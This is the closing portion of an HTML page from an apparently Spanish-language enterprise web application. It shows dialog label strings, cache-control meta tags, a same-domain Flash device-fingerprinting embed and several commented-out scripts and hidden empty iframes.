        var jqueryAlerta = 'Alerta';
        var jqueryError = 'Error';
        var jqueryInfo = 'Info';
        var jqueryAyuda = 'Ayuda';
        var jqueryConfirmar = 'Confirmar';
        var jqueryAviso = 'Aviso';
        var jquerySelect = 'Seleccionar';

    </script>-->










    <meta http-equiv="expires" content="0">
    <meta http-equiv="Pragma" content="no-cache">

    <!--<script language="JavaScript" type="text/javascript">
        /*
        var fpString = "";
        var andString = "";

        if (top != self) top.location.href = location.href;

        function navigateToUrl(url) {
            window.location.href = url;
        }
        */

    </script>
    <script language="javascript1.1">
        /*
		  function navigateToUrl(url) {
			 window.location.replace(url);
		  }
	   //*/
	   </script>
    <script>
        /*
	   		BrowserDetect.init();
	   	*/
	   </script>-->


    <input type="hidden" id="ruta" value="/EaiEmpresasWAR">
    <!--<script src="../../eai/EaiEmpresasWAR/js/rsa/AC_OETags.js" language="javascript"></script>-->
    <script language="JavaScript" type="text/javascript">
        
        var requiredMajorVersion = 6;
        
        var requiredMinorVersion = 0;
        
        var requiredRevision = 0;
        
    </script>
    <script language="JavaScript" type="text/javascript">
        
        //var hasReqestedVersion = DetectFlashVer(requiredMajorVersion, requiredMinorVersion, requiredRevision);
        

    </script>

    <!--<script language="JavaScript" type="text/javascript">
        
        if (hasReqestedVersion) {
            var d = new Date().getTime();
            var out = "";
            out = out + "<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'" + "\n";
            out = out + "width='1' height='1'>" + "\n";
            out = out + "<param name='movie' value='/eai/EaiEmpresasWAR/js/rsa/pmfso.swf?nocache=" + d + "'>" + "\n";
            out = out + "<param name='quality' value='high'>" + "\n";
            out = out + "<param name='bgcolor' value=#FFFFFF>" + "\n";
            out = out + "<param name='allowScriptAccess' value='sameDomain'>" + "\n";
            out = out + "<param name='FlashVars' value='gotoUrl=&sendUrl=/eai/EaiEmpresasWAR/js/rsa/FSOServlet.jsp&browserType=" + BrowserDetect.browser + "'>" + "\n";
            out = out + "<embed src='/eai/EaiEmpresasWAR/js/rsa/pmfso.swf?nocache=" + d + "'" + "\n";
            out = out + "FlashVars='gotoUrl=&sendUrl=/eai/EaiEmpresasWAR/js/rsa/FSOServlet.jsp&browserType=" + BrowserDetect.browser + "'" + "\n";
            out = out + "allowScriptAccess='sameDomain'" + "\n";
            out = out + "quality='high' bgcolor='#FFFFFF' width='1' height='1'" + "\n";
            out = out + "type='application/x-shockwave-flash'>" + "\n";
            out = out + "<noembed>" + "\n";
            out = out + "<script>" + "\n";
            out = out + "navigateToUrl('');" + "\n";
            out = out + "<\u002fscript>" + "\n";
            out = out + " <\u002fnoembed>" + "\n";
            out = out + "<noobject><\u002fnoobject>" + "\n";
            out = out + "<\u002fembed>" + "\n";
            out = out + "<noobject><\u002fnoobject>" + "\n";
            out = out + "<\u002fobject>" + "\n";
            document.write(out);
        }
        

    </script>-->
    <noscript>
        <object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' width='1' height='1'>
            <param name='movie' value='pmfso.swf'>
            <param name='quality' value='high'>
            <param name='bgcolor' value=#FFFFFF>
            <param name='FlashVars' value='gotoUrl=&sendUrl=/eai/EaiEmpresasWAR/js/rsa/FSOServlet.jsp'>
            <embed src='/eai/eai/EaiEmpresasWAR/js/rsa/pmfso.swf' FlashVars='gotoUrl=&sendUrl=/eai/EaiEmpresasWAR/js/rsa/FSOServlet.jsp' quality='high' bgcolor='#FFFFFF' width='1' height='1' type='application/x-shockwave-flash'>
            <noembed></noembed>
            <noobject></noobject>
            </embed>
            <noobject></noobject>
        </object>
    </noscript>


    <!-- /jsp:include-->
    
    <!--
    <iframe id="iframe561" frameborder="0" src="about:blank" title="ummtku" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe433" frameborder="0" src="about:blank" title="usrc_c" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe frameborder="0" title="qfzkgu" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"></iframe><iframe frameborder="0" title="xerudr" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe112" frameborder="0" src="about:blank" title="viaaco" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe790" frameborder="0" src="about:blank" title="ghqord" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe375" frameborder="0" src="about:blank" title="hvqzuk" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe629" frameborder="0" src="about:blank" title="obohx_" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe475" frameborder="0" src="about:blank" title="abnii_" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe589" frameborder="0" src="about:blank" title="onpphy" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe923" frameborder="0" src="about:blank" title="idlxgs" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe354" frameborder="0" src="about:blank" title="nagvqh" style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    -->
</body>

</html>
